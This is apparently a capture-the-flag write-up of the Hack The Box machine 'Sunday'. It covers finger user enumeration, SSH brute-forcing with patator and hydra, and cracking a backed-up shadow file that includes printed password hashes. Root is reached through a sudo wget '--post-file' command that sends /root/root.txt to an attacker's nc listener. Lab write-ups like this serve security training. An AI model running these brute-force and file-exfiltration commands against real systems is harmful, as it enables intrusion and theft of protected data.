# HTB - Sunday
## OS - Solaris

I started with an nmap scan of Sunday (IP address: 10.10.10.76). The usual -sC -sV options showed that a lot of ports were filtered, so I ran the -p- option to look for open ports.


```
$nmap -p- -A 10.10.10.76 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-18 15:20 PST


Nmap scan report for 10.10.10.76
Host is up (0.093s latency).
Scanned at 2021-01-18 15:20:41 PST for 3634s
Not shown: 42073 closed ports, 23457 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|_  ERROR: rpcbind connect error: TIMEOUT
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
47416/tcp open  unknown
61633/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
Final times for host: srtt: 92977 rttvar: 927  to: 100000

```

Finger is running on port 79. SSH is running on port 22022.

Finger is a user information protocol that is used to view another user's basic info and return a satus report.

Metasploit has an auxiliary module that can identify valid users through finger service, but the result did not seem useful. I browsed for finger user enumeration exploits. Got one from pentestmonkey, called finger-user-enum.


```
$./finger-user-enum.pl -U /opt/seclists/SecLists/Usernames/Names/names.txt -t 10.10.10.76 -m 50
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 50
Usernames file ........... /opt/seclists/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Wed Jan 20 18:13:28 2021 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
sammy@10.10.10.76: sammy                 console      <Jul 31 17:59>..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Wed Jan 20 18:15:48 2021 #########
15 results.

10177 queries in 140 seconds (72.7 queries / sec)
```

Not sure what that output means, but the output for root, sammy, and sunny seems different from the rest. So focusing only on these three.

```
root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
sammy@10.10.10.76: sammy                 console      <Jul 31 17:59>..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
```

We have some user accounts to try now.

We have sunny and sammy user accounts. Next step is to bruteforce. There are a few tools to try, like Patator and Hydra.

```
$patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/opt/seclists/SecLists/Passwords/probable-v2-top1575.txt persistent=0
```

The output shows "sunday" as the password for "sunny"

```
16:03:02 patator    INFO - 1     22     0.892 | children                           |   835 | Authentication failed.
16:03:02 patator    INFO - 0     19     0.827 | sunday                             |   880 | SSH-2.0-Sun_SSH_1.3
16:03:03 patator    INFO - 1     22     0.606 | january                            |   816 | Authentication failed.

```

hydra works for this too.

```
$hydra -s 22022 -v -V -l sunny -P /opt/seclists/SecLists/Passwords/probable-v2-top1575.txt -t 8 10.10.10.76 ssh
```

The output shows:

```
[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "therock" - 879 of 1575 [child 5] (0/0)
[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sunday" - 880 of 1575 [child 4] (0/0)
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
[STATUS] attack finished for 10.10.10.76 (waiting for children to complete tests)

```


When trying to ssh in as sunny, we get an error:

```
$ssh sunny@10.10.10.76 -p 22022
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

We need to add the key exchange algorithm to our connection.

```
$ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022
```

This works.

```
$ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022

The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (RSA) to the list of known hosts.
Password: 
Last login: Fri Jan 22 05:36:58 2021 from 10.10.14.12
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$
```

This user doesn't have the user flag, so I tried sudo.

```
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ 
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
sunny@sunday:~$
```

That did not help. So I went to / and started browsing.

```
sunny@sunday:~$ cd /
sunny@sunday:/$ ls
backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var
bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr
sunny@sunday:/$ 
sunny@sunday:/$ cd /backup/
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
```

The first folder was named backup. shadow.backup turned out to be the backup of shadow file.

```
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
running John on it shows the two password hashes.

```
$john shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt
```

Now logging in with sammy's password gives us the user flag.

```
$ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p 22022
Password: 
Last login: Fri Jul 31 17:59:59 2020
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ ls -l
total 6
drwxr-xr-x 2 sammy staff 4 2018-04-15 20:37 Desktop
drwxr-xr-x 6 sammy staff 6 2018-04-15 20:15 Documents
drwxr-xr-x 2 sammy staff 2 2018-04-15 20:15 Downloads
drwxr-xr-x 2 sammy staff 2 2018-04-15 20:15 Public
sammy@sunday:~$ cd Desktop
sammy@sunday:~/Desktop$ ls
user.txt
sammy@sunday:~/Desktop$ cat user.txt
```

To get the root flag, tried "sudo -l".

```
sammy@sunday:~/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget

```

Browsing through wget help shows that **there is a post-file option that uses POST method and sends the contents of a file**. Using this option to send the root.txt file.

On the attack host, I ran nc listener on port 8001. On the Sunday HTB VM, I ran wget command with the post-file option:


```
sammy@sunday:~/Desktop$ sudo wget --post-file=/root/root.txt 10.10.14.12:8001
--06:05:37--  http://10.10.14.12:8001/
           => `index.html'
Connecting to 10.10.14.12:8001... connected.
HTTP request sent, awaiting response...
```

On the attack host:

```
$nc -lvnp 8001
listening on [any] 8001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.76] 33788
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.12:8001
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
```

This was a very interesting way to get the root flag.






